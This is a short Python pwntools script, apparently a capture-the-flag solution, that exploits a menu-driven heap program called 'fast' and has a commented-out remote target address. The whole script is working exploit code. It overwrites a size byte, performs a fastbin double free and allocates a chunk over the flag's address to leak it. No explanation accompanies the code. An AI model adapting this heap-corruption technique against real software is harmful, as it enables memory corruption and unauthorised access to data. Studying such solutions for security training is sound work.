from pwn import *
# context.log_level = 'debug'
def malloc(size, buf):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Name: ')
    p.send(buf)
    p.recvuntil(': ')
    Name = p.recvuntil('\n')[:-1]
    p.recvuntil(': ')
    Addr = p.recvuntil('\n')[:-1]
    return (Name, Addr)
def free(addr):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil(': ')
    p.sendline(addr)
    p.recvuntil('!')
p = process('./fast')
# p = remote('35.221.144.41',10001)
flag = 0x204056
p.sendline('a'*94 + chr(0x81))
_, Addr1 = malloc(120, '123123')
_, Addr2 = malloc(120, '123123')
free(Addr1)
free(Addr2)
free(Addr1)
malloc(120, p64(flag))
malloc(120, '123123')
malloc(120, 'BBBBBB')
flag,a = malloc(120,'a'*26)
print(flag[26:])
p.close()